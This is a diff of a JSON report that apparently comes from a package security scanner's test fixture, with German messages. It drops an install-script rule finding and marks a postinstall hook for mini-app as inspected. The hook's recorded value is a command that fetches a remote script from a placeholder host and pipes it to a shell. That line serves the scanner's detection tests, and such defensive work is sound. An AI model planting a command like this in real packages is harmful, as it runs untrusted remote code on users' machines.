@@ -43,14 +43,6 @@
       "message": "1 Pakete nicht gegen OSV geprüft (offline, kein/stale Cache)."
     },
     {
-      "rule": "install_scripts",
-      "package_name": "mini-app",
-      "package_version": "1.0.0",
-      "configured_action": "fail",
-      "effective_action": "warn",
-      "message": "Install-Hook `postinstall` in mini-app@1.0.0 ist nicht auf der Allowlist."
-    },
-    {
       "rule": "no_outbound_build",
       "package_name": "mini-app",
       "package_version": "1.0.0",
@@ -78,7 +70,8 @@
       "hook": "postinstall",
       "location": "{root}/package.json#scripts.postinstall",
       "raw": "curl https://example.invalid/setup.sh | sh",
-      "provenance": "manifest"
+      "provenance": "manifest",
+      "disposition": "inspected"
     }
   ],
   "heuristics": [
